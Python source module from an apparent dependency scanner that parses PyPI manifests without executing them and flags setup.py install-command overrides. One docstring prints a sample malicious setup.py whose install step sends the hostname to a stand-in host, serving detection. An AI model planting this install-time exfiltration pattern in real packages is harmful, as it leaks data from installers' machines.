"""PyPI: pyproject.toml, requirements files, Pipfile and Poetry.

``setup.py`` is treated as **source code to analyse, never as a module to
import**. That is the whole point of the rule: a setup script is arbitrary
Python that executes at install time, so importing one to read its metadata
would run exactly the code the scanner exists to inspect. Metadata is recovered
by walking the parsed syntax tree for literal assignments only, using Python's
own ``ast`` module, which parses without executing.
"""

from __future__ import annotations

import ast
import re
import tomllib
from collections.abc import Sequence
from typing import TYPE_CHECKING, Any, ClassVar

from cordon_scanner.analysis.python.pysyntax import PythonSyntax
from cordon_scanner.ecosystems.base import (
    BaseEcosystem,
    DeclaredDependency,
    InstallTool,
    Manifest,
    ReleaseFile,
)
from cordon_scanner.ecosystems.packages.python.lockfiles import PypiLockfiles
from cordon_scanner.ecosystems.packages.python.requirements import (
    _NORMALIZE,
    PypiManifest,
    PypiRequirement,
)
from cordon_scanner.foundation.models import Hook, Scope

if TYPE_CHECKING:
    from collections.abc import Sequence

    from cordon_scanner.foundation.content import FileContent


class PypiEcosystem(PypiLockfiles, BaseEcosystem):
    @staticmethod
    def _poetry_spec(value: object) -> str:
        """Render a table-valued dependency spec as a string."""
        if isinstance(value, dict):
            for key in ("version", "git", "url", "path"):
                if key in value:
                    return str(value[key])
            return "*"
        return str(value)

    @staticmethod
    def _poetry_entries(
        name: str, spec: object, scope: Scope, field_name: str
    ) -> list[DeclaredDependency]:
        """One Poetry (or Pipfile) dependency value: a string, a table, or a list of tables.

        A table can carry `version`, `git` + `rev`/`tag`/`branch`, `path` (+ `develop`), `url`,
        `extras`, `markers`, `python`, `platform` and `optional`; a list holds one table per
        environment (`[{version = "<2", python = "<3.8"}, {version = ">=2", python = ">=3.8"}]`).
        """
        values = spec if isinstance(spec, list) else [spec]
        out: list[DeclaredDependency] = []
        for value in values:
            if isinstance(value, str):
                out.append(
                    DeclaredDependency(name=name, spec=value, scope=scope, field_name=field_name)
                )
                continue
            if not isinstance(value, dict):
                continue
            text = PypiEcosystem._poetry_spec(value)
            if "git" in value:
                ref = value.get("rev") or value.get("tag") or value.get("branch")
                text = f"git+{value['git']}" + (f"@{ref}" if ref else "")
            conditions: list[str] = []
            for key in ("markers", "python", "platform", "sys_platform"):
                if isinstance(value.get(key), str):
                    conditions.append(value[key] if key == "markers" else f"{key} {value[key]}")
            extras = value.get("extras")
            out.append(
                DeclaredDependency(
                    name=name,
                    spec=text,
                    scope=Scope.OPTIONAL
                    if value.get("optional") is True and scope is Scope.RUNTIME
                    else scope,
                    field_name=field_name,
                    platform=tuple(conditions),
                    extras=tuple(str(e) for e in extras) if isinstance(extras, list) else (),
                    editable=bool(value.get("develop") or value.get("editable")),
                )
            )
        return out

    id = "pypi"

    _REQUIRES_DIST: ClassVar[re.Pattern[str]] = re.compile(
        r"(?m)^Requires-Dist:\s*([A-Za-z0-9][A-Za-z0-9._-]*)([^\n]*)$"
    )

    def declared_dependencies(self, files: Sequence[ReleaseFile]) -> frozenset[str]:
        """A published distribution's runtime dependencies: its `Requires-Dist`, extras left out."""
        for file in files:
            member = file.path.rpartition("!")[2]
            if member.endswith(("/PKG-INFO", ".dist-info/METADATA")) and member.count("/") == 1:
                return frozenset(
                    re.sub(r"[-_.]+", "-", found.group(1)).lower()
                    for found in PypiEcosystem._REQUIRES_DIST.finditer(file.content.text[:200_000])
                    if "extra ==" not in found.group(2)
                )
        return frozenset()

    purl_type = "pypi"
    manifest_globs: tuple[str, ...] = (
        "**/pyproject.toml",
        "**/setup.py",
        "**/setup.cfg",
        "**/requirements*.txt",
        "**/requirements/*.txt",
        "**/requirements*.in",
        # `requirements/base.in` as well as `requirements.in`, for the reason the `.txt` pair
        # above needed it. A `.in` is pip-compile's INPUT - the file a person edits, where a
        # dependency is first named and where a typosquatted name would be introduced - so a
        # layout that splits it by environment was the one hiding the human-authored half of
        # the dependency list. It is a manifest only, never a lockfile: a `.in` carries ranges
        # and no hashes by design, and reporting one as resolved would claim a precision the
        # file does not have.
        "**/requirements/*.in",
        "**/Pipfile",
    )
    lockfile_globs: tuple[str, ...] = (
        "**/poetry.lock",
        "**/Pipfile.lock",
        "**/pdm.lock",
        "**/uv.lock",
        "**/requirements*.txt",
        # `requirements/base.txt`, not just `requirements.txt`. `manifest_globs` has carried
        # both spellings from the start; this list had only the first, so the pip-tools layout
        # -- a `requirements/` directory holding `base.txt`, `dev.txt`, `prod.txt`, which is
        # what `pip-compile` produces for anything larger than a toy -- was read as a manifest
        # and never as a lockfile. `_parse_pinned_requirements` reads `--hash=` continuations
        # correctly and was simply never reached, so every hash-pinned dependency in those
        # files was reported by `POLICY.DEPENDENCY.INTEGRITY.001` as carrying no hash.
        #
        # The finding was the exact inverse of the truth: the projects most likely to split
        # requirements across a directory are the ones large enough to have adopted hash
        # pinning, so the accusation landed hardest on the files that had done the work.
        "**/requirements/*.txt",
    )
    registry_hosts: frozenset[str] = frozenset(
        {
            "pypi.org",
            "files.pythonhosted.org",
            "pypi.python.org",
            # Public mirrors of PyPI, serving its files under its names (see npm's list).
            "pypi.tuna.tsinghua.edu.cn",
            "mirrors.tuna.tsinghua.edu.cn/pypi",
            "mirrors.aliyun.com/pypi",
            "pypi.douban.com",
            "pypi.mirrors.ustc.edu.cn",
            "mirrors.ustc.edu.cn/pypi",
            "mirrors.bfsu.edu.cn/pypi",
            "mirrors.cloud.tencent.com/pypi",
            "repo.huaweicloud.com/repository/pypi",
            "mirrors.huaweicloud.com/repository/pypi",
        }
    )

    def normalize_name(self, name: str) -> str:
        """PEP 503 normalisation.

        Runs of ``-``, ``_`` and ``.`` are equivalent and fold to a single
        hyphen, and comparison is case-insensitive. Without this, ``zope.interface``,
        ``zope-interface`` and ``Zope_Interface`` look like three different
        packages, which breaks both advisory matching and typosquat detection in
        opposite directions.
        """
        return _NORMALIZE.sub("-", name.strip().lower())

    # -- Manifests -------------------------------------------------------

    def parse_manifest(self, content: FileContent) -> Manifest:
        name = content.basename
        if name == "pyproject.toml":
            return self._parse_pyproject(content)
        if name == "setup.py":
            return self._parse_setup_py(content)
        if name == "Pipfile":
            return self._parse_pipfile(content)
        if name == "setup.cfg":
            return self._parse_setup_cfg(content)
        if name.startswith("requirements") or PypiManifest._in_requirements_dir(content.path):
            return self._parse_requirements(content)
        return Manifest(path=content.path, ecosystem=self.id)

    def _parse_pyproject(self, content: FileContent) -> Manifest:
        try:
            data = tomllib.loads(content.text)
        except (tomllib.TOMLDecodeError, ValueError) as exc:
            return Manifest(
                path=content.path, ecosystem=self.id, parse_error=f"invalid TOML: {exc}"
            )

        project = data.get("project") or {}
        declared: list[DeclaredDependency] = []
        repository = PypiManifest._repository_of(project)

        for spec in project.get("dependencies") or []:
            parsed = self._declared(str(spec), Scope.RUNTIME, "project.dependencies")
            if parsed:
                declared.append(parsed)

        for extra, specs in (project.get("optional-dependencies") or {}).items():
            for spec in specs or []:
                parsed = self._declared(str(spec), Scope.OPTIONAL, f"optional-dependencies.{extra}")
                if parsed:
                    declared.append(parsed)

        python = self._python(project.get("requires-python"), "project.requires-python")
        if python is not None:
            declared.append(python)

        # PEP 735 dependency groups: development, test, docs -- never installed with the package.
        groups = data.get("dependency-groups")
        if isinstance(groups, dict):
            for group, specs in groups.items():
                scope = Scope.TEST if "test" in str(group).lower() else Scope.DEV
                for spec in specs if isinstance(specs, list) else ():
                    if isinstance(spec, str):
                        parsed = self._declared(spec, scope, f"dependency-groups.{group}")
                        if parsed:
                            declared.append(parsed)

        # The requirements of the build itself (setuptools, hatchling, a build-time code
        # generator): installed into the build environment of every source install.
        build_requires = (data.get("build-system") or {}).get("requires")
        for spec in build_requires if isinstance(build_requires, list) else ():
            if isinstance(spec, str):
                parsed = self._declared(spec, Scope.BUILD, "build-system.requires")
                if parsed:
                    declared.append(parsed)

        # Poetry keeps its dependencies elsewhere: the main table, the legacy dev table, and one
        # table per group (`[tool.poetry.group.test.dependencies]`).
        poetry = (data.get("tool") or {}).get("poetry") or {}
        tables: list[tuple[str, Scope, object]] = [
            ("tool.poetry.dependencies", Scope.RUNTIME, poetry.get("dependencies")),
            ("tool.poetry.dev-dependencies", Scope.DEV, poetry.get("dev-dependencies")),
        ]
        poetry_groups = poetry.get("group")
        if isinstance(poetry_groups, dict):
            for group, body in poetry_groups.items():
                if isinstance(body, dict):
                    scope = Scope.TEST if "test" in str(group).lower() else Scope.DEV
                    tables.append(
                        (f"tool.poetry.group.{group}.dependencies", scope, body.get("dependencies"))
                    )
        for field_name, scope, table in tables:
            for pkg, spec in (table if isinstance(table, dict) else {}).items():
                if pkg == "python":
                    entry = self._python(spec, f"{field_name}.python")
                    if entry is not None:
                        declared.append(entry)
                    continue
                declared.extend(PypiEcosystem._poetry_entries(str(pkg), spec, scope, field_name))

        hooks: list[Hook] = []
        build = data.get("build-system") or {}
        backend = build.get("build-backend")
        self._local_backend(backend, hooks, content)

        return Manifest(
            path=content.path,
            ecosystem=self.id,
            name=PypiEcosystem._str_or_none(project.get("name"))
            or PypiEcosystem._str_or_none(poetry.get("name")),
            version=PypiEcosystem._str_or_none(project.get("version"))
            or PypiEcosystem._str_or_none(poetry.get("version")),
            dependencies=tuple(declared),
            hooks=tuple(hooks),
            repository=repository,
        )

    def _local_backend(self, backend: Any | None, hooks: list[Hook], content: FileContent) -> None:
        """A build backend that is code in this repository, as a hook that runs during every build."""
        if isinstance(backend, str) and backend.startswith("."):
            # A local build backend is code in this repository that runs during
            # every build, including inside the packaging environment.
            hooks.append(
                Hook(
                    kind="build",
                    path=content.path,
                    name="build-backend",
                    command=backend,
                    ecosystem=self.id,
                )
            )

    def _parse_setup_py(self, content: FileContent) -> Manifest:
        """Recover metadata from setup.py without executing it.

        ``ast.parse`` builds a syntax tree and runs nothing. Only literal
        arguments are read; anything computed is deliberately ignored rather
        than evaluated, because evaluating it is the attack.

        The file is always registered as a build hook regardless of what is
        found, because its mere existence means arbitrary Python executes at
        install time.
        """
        hooks: list[Hook] = [
            Hook(
                kind="build",
                path=content.path,
                name="setup.py",
                command="python setup.py",
                ecosystem=self.id,
            )
        ]

        try:
            tree = PythonSyntax.parse(content.text, filename=content.path)
        except SyntaxError as exc:
            return Manifest(
                path=content.path,
                ecosystem=self.id,
                hooks=tuple(hooks),
                parse_error=f"could not parse: {exc}",
            )

        override = self._install_override_hook(tree, content.path)
        if override is not None:
            hooks.append(override)

        name: str | None = None
        version: str | None = None
        declared: list[DeclaredDependency] = []

        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            called = (
                func.id
                if isinstance(func, ast.Name)
                else func.attr
                if isinstance(func, ast.Attribute)
                else ""
            )
            if called != "setup":
                continue

            name, version = self._setup_keywords(node, declared, name, version)

        return Manifest(
            path=content.path,
            ecosystem=self.id,
            name=name,
            version=version,
            dependencies=tuple(declared),
            hooks=tuple(hooks),
        )

    def _setup_keywords(
        self,
        node: ast.Call,
        declared: list[DeclaredDependency],
        name: str | None,
        version: str | None,
    ) -> tuple[str | None, str | None]:
        """What a setup() call's keywords declare: its name and version, and its install, setup, test,
        extra and Python requirements."""
        for keyword in node.keywords:
            if keyword.arg == "name" and isinstance(keyword.value, ast.Constant):
                if isinstance(keyword.value.value, str):
                    name = keyword.value.value
            elif keyword.arg == "version" and isinstance(keyword.value, ast.Constant):
                if isinstance(keyword.value.value, str):
                    version = keyword.value.value
            elif keyword.arg == "install_requires":
                declared.extend(
                    self._from_literal_list(keyword.value, Scope.RUNTIME, "install_requires")
                )
            elif keyword.arg == "setup_requires":
                declared.extend(
                    self._from_literal_list(keyword.value, Scope.BUILD, "setup_requires")
                )
            elif keyword.arg == "tests_require":
                declared.extend(self._from_literal_list(keyword.value, Scope.TEST, "tests_require"))
            elif keyword.arg == "extras_require" and isinstance(keyword.value, ast.Dict):
                for key, value in zip(keyword.value.keys, keyword.value.values, strict=True):
                    extra = (
                        str(key.value)
                        if isinstance(key, ast.Constant) and isinstance(key.value, str)
                        else "?"
                    )
                    declared.extend(
                        self._from_literal_list(value, Scope.OPTIONAL, f"extras_require.{extra}")
                    )
            elif keyword.arg == "python_requires" and isinstance(keyword.value, ast.Constant):
                python = self._python(keyword.value.value, "python_requires")
                if python is not None:
                    declared.append(python)
        return name, version

    #: setuptools commands that run on the machine of whoever installs the package.
    #:
    #: `install` is the one that matters and the one the malware overrides. The
    #: others here are its parts: setuptools dispatches `install_lib` and
    #: `install_scripts` from it, and overriding either reaches a consumer just the
    #: same.
    #:
    #: Everything NOT in this set is the reason the set exists. `build_ext`,
    #: `build_py` and `build_clib` run when the package is built; `sdist` and
    #: `bdist_wheel` when it is packaged; `develop` when somebody types
    #: `pip install -e` in the project's own directory. None reaches a consumer
    #: installing from a wheel or an sdist, and legitimate projects override
    #: exactly those: `vllm` subclasses `build_ext` and `build_rust`,
    #: `saltstack/salt` subclasses `develop`, `sdist` and `bdist_egg`. Neither
    #: subclasses `install`, and the malware always does.
    #:
    #: The same distinction npm has documented since version 7 and that
    #: `core.models.CONSUMER_TIME_HOOKS` already draws for `postinstall` against
    #: `prepare`.
    CONSUMER_INSTALL_COMMANDS = frozenset({"install", "install_lib", "install_scripts"})

    def _install_override_hook(self, tree: ast.AST, path: str) -> Hook | None:
        """A `cmdclass` override of a consumer-time install command.

        Two halves, both required. A class has to subclass one of
        `CONSUMER_INSTALL_COMMANDS`, and `setup()` has to be told to use it --
        a subclass nobody wires in runs on nobody's machine.

        Measured: 82 of the 252 real malicious PyPI packages still undetected
        after the recall work are this shape, and it is written the same way every
        time:

            class CustomInstall(install):
                def run(self):
                    install.run(self)
                    requests.get("https://collect.invalid/p?h=" + hostname)

            setup(..., cmdclass={"install": CustomInstall})

        Reading it without executing it is the whole point; `ast.parse` runs
        nothing, which is the same reason this module already recovers metadata
        this way.
        """
        # `from setuptools.command.install import install as _install`: the base is
        # written under its alias, and the command it names is the original.
        aliases = {
            alias.asname: alias.name
            for node in ast.walk(tree)
            if isinstance(node, ast.ImportFrom)
            for alias in node.names
            if alias.asname
        }
        overriding: set[str] = set()
        for node in ast.walk(tree):
            if not isinstance(node, ast.ClassDef):
                continue
            for base in node.bases:
                named = (
                    base.id
                    if isinstance(base, ast.Name)
                    else base.attr
                    if isinstance(base, ast.Attribute)
                    else ""
                )
                if aliases.get(named, named) in self.CONSUMER_INSTALL_COMMANDS:
                    overriding.add(node.name)
        if not overriding:
            return None

        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            for keyword in node.keywords:
                if keyword.arg != "cmdclass" or not isinstance(keyword.value, ast.Dict):
                    continue
                for key, value in zip(keyword.value.keys, keyword.value.values, strict=True):
                    wired = (
                        value.id
                        if isinstance(value, ast.Name)
                        else value.attr
                        if isinstance(value, ast.Attribute)
                        else ""
                    )
                    command = (
                        key.value
                        if isinstance(key, ast.Constant) and isinstance(key.value, str)
                        else ""
                    )
                    if wired in overriding and command in self.CONSUMER_INSTALL_COMMANDS:
                        return Hook(
                            kind="consumerinstall",
                            path=path,
                            name="install",
                            command=f"python setup.py install ({wired}.run)",
                            ecosystem=self.id,
                        )
        return None

    def _from_literal_list(
        self, node: ast.expr, scope: Scope, field_name: str
    ) -> list[DeclaredDependency]:
        """Read a list of string literals, ignoring anything computed."""
        if not isinstance(node, (ast.List, ast.Tuple)):
            return []
        out: list[DeclaredDependency] = []
        for element in node.elts:
            if isinstance(element, ast.Constant) and isinstance(element.value, str):
                parsed = self._declared(element.value, scope, field_name)
                if parsed:
                    out.append(parsed)
        return out

    _OPTION = re.compile(r"^(-[A-Za-z]|--[a-z-]{2,40})(?:[=\s]\s*(.*))?$")

    def _parse_requirements(self, content: FileContent) -> Manifest:
        """A pip requirements file: requirements, and the options that change what they mean.

        ```
          -r / --requirement FILE      another requirements file, read as part of this one
          -c / --constraint FILE       pins that apply to whatever the requirements resolve
          -e / --editable TARGET       a project installed in place (path or VCS URL)
          -i / --index-url URL         where resolution looks (and --extra-index-url beside it)
          --hash=...                   integrity, read where the file is a lockfile
        ```
        """
        declared: list[DeclaredDependency] = []
        includes: list[tuple[str, str]] = []
        sources: list[str] = []
        lines = PypiEcosystem._logical_lines(content.text)
        for line in lines:
            option = self._OPTION.match(line) if line.startswith("-") else None
            if option is not None:
                flag, value = option.group(1), (option.group(2) or "").strip()
                if flag in ("-r", "--requirement") and value:
                    includes.append(("requirements", value))
                elif flag in ("-c", "--constraint") and value:
                    includes.append(("constraints", value))
                elif flag in ("-e", "--editable") and value:
                    entry = PypiRequirement.editable(value, content.basename)
                    if entry.name != ".":
                        declared.append(entry)
                elif (
                    flag in ("-i", "--index-url", "--extra-index-url", "-f", "--find-links")
                    and value
                ):
                    kind = {"-i": "index-url", "-f": "find-links"}.get(flag, flag.lstrip("-"))
                    sources.append(f"{kind} {value.split()[0]}")
                continue
            parsed = self._declared(line, Scope.RUNTIME, content.basename)
            if parsed:
                declared.append(parsed)
        return Manifest(
            path=content.path,
            ecosystem=self.id,
            dependencies=tuple(declared),
            includes=tuple(includes),
            sources=tuple(sources),
        )

    def parse_included(self, content: FileContent) -> Manifest:
        """A file named by `-r` or `-c`, whatever it is called: always pip's requirements format."""
        return self._parse_requirements(content)

    def _parse_setup_cfg(self, content: FileContent) -> Manifest:
        """`[metadata]` and `[options]` of a setuptools configuration, read with configparser.

        Declarative: unlike setup.py, nothing here can run, and the file is read for what it says.
        """
        import configparser

        parser = configparser.ConfigParser(interpolation=None, strict=False)
        try:
            parser.read_string(content.text)
        except configparser.Error as exc:
            return Manifest(
                path=content.path, ecosystem=self.id, parse_error=f"invalid setup.cfg: {exc}"
            )
        declared: list[DeclaredDependency] = []

        def requirements(section: str, key: str, scope: Scope) -> None:
            if parser.has_option(section, key):
                for line in parser.get(section, key).splitlines():
                    entry = self._declared(line, scope, f"{section}.{key}")
                    if entry is not None:
                        declared.append(entry)

        requirements("options", "install_requires", Scope.RUNTIME)
        requirements("options", "setup_requires", Scope.BUILD)
        requirements("options", "tests_require", Scope.TEST)
        if parser.has_section("options.extras_require"):
            for extra in parser.options("options.extras_require"):
                requirements("options.extras_require", extra, Scope.OPTIONAL)
        if parser.has_option("options", "python_requires"):
            python = self._python(
                parser.get("options", "python_requires"), "options.python_requires"
            )
            if python is not None:
                declared.append(python)
        name = parser.get("metadata", "name", fallback=None)
        version = parser.get("metadata", "version", fallback=None)
        return Manifest(
            path=content.path,
            ecosystem=self.id,
            name=name.strip() if name else None,
            version=version.strip()
            if version and not version.strip().startswith("attr:")
            else None,
            dependencies=tuple(declared),
        )

    def _parse_pipfile(self, content: FileContent) -> Manifest:
        try:
            data = tomllib.loads(content.text)
        except (tomllib.TOMLDecodeError, ValueError) as exc:
            return Manifest(
                path=content.path, ecosystem=self.id, parse_error=f"invalid TOML: {exc}"
            )
        declared: list[DeclaredDependency] = []
        for section, scope in (("packages", Scope.RUNTIME), ("dev-packages", Scope.DEV)):
            for pkg, spec in (data.get(section) or {}).items():
                declared.extend(PypiEcosystem._poetry_entries(str(pkg), spec, scope, section))
        requires = data.get("requires")
        if isinstance(requires, dict):
            python = self._python(
                requires.get("python_full_version") or requires.get("python_version"), "requires"
            )
            if python is not None:
                declared.append(python)
        listed = [
            s
            for s in data.get("source") or ()
            if isinstance(s, dict) and isinstance(s.get("url"), str)
        ]
        # Pipenv hands every source after the first to pip as an extra index, unless each package
        # names its `index`: the same merge `--extra-index-url` makes.
        pinned = all(
            isinstance(spec, dict) and spec.get("index")
            for section in ("packages", "dev-packages")
            for spec in (data.get(section) or {}).values()
        )
        sources = tuple(
            f"{'index-url' if n == 0 or pinned else 'extra-index-url'} {s['url']}"
            for n, s in enumerate(listed)
        )
        return Manifest(
            path=content.path, ecosystem=self.id, dependencies=tuple(declared), sources=sources
        )

    @staticmethod
    def _declared(spec: str, scope: Scope, field_name: str) -> DeclaredDependency | None:
        return PypiRequirement.declared(spec, scope, field_name)

    @staticmethod
    def _python(spec: object, field_name: str) -> DeclaredDependency | None:
        """The Python versions a project supports, as a platform requirement (never a package:
        `python` on PyPI is an unrelated distribution, and no registry check applies)."""
        if isinstance(spec, str) and spec.strip():
            return DeclaredDependency(
                name="python", spec=spec.strip(), scope=Scope.PLATFORM, field_name=field_name
            )
        return None

    # -- the projects mcp writes for a package check (EcosystemProjects) ------------

    def pinned_project(self, pins: Sequence[tuple[str, str]]) -> dict[str, str] | None:
        """A project pinning these releases, as its own lockfile: `{path: content}`."""
        return {"requirements.txt": "".join(f"{name}=={version}\n" for name, version in pins)}

    def loose_project(self, names: Sequence[str]) -> dict[str, str] | None:
        """A project naming these packages with no version: `{path: content}`."""
        return {"requirements.txt": "".join(f"{name}\n" for name in names)}

    def install_tool(self) -> Sequence[InstallTool]:
        """pip and the Python tools that install from PyPI; each one's own subcommands."""
        return (
            InstallTool(
                frozenset({"pip", "pip3", "pipx", "uv", "poetry", "pdm", "rye", "uvx", "pipenv"}),
                "python",
            ),
        )

    # -- the release a published archive is (EcosystemReleaseIdentity) -------------

    def identity_in_metadata(self) -> bool:
        """The release names itself in the metadata every published archive's checks read."""
        return True

    # -- what a published archive of it runs at install (EcosystemArchiveTraits) ---------

    def compiled_is_inert(self) -> bool:
        """A compiled file in its archive does not run at install."""
        return True

    def install_manifests(self) -> frozenset[str]:
        """The files its installer runs or reads to build: an author-time file elsewhere."""
        return frozenset({"setup.py", "pyproject.toml"})

    # -- Lockfiles -------------------------------------------------------


__all__ = ["PypiEcosystem"]
